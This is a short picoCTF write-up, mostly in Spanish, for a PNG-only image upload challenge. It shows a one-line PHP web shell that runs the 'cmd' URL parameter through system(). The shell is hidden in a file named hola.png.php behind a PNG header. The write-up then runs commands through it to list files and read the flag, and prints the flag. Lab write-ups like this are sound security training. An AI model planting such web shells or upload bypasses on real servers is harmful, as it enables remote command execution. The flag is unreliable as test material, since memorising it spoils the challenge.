I found a web app that can help process images: PNG images only! Try it [here](http://atlas.picoctf.net:54816/)!

# Solución
Podemos subir un archivo PNG pero con código PHP para hacer ejecución de comandos remotamente 
Creamos el archivo hola.png.php con el codigo:
```
PNG
<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
```
Despues podemos ejecutar comandos a partir de la url de donde se subio el archivo, podemos ver los archivos que están en una carpeta arriba:
```
http://atlas.picoctf.net:54816/uploads/hola.png.php/?cmd=ls ..
```
Y vemos
```
PNG GQ4DOOBVMMYGK.txt index.php instructions.txt robots.txt uploads
```
Entonces hacemos un cat al archivo GQ4DOOBVMMYGK.txt 
```
http://atlas.picoctf.net:54816/uploads/hola.png.php/?cmd=%20cat%20../GQ4DOOBVMMYGK.txt
```
Y vemos la flag
```
PNG /* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e} */
```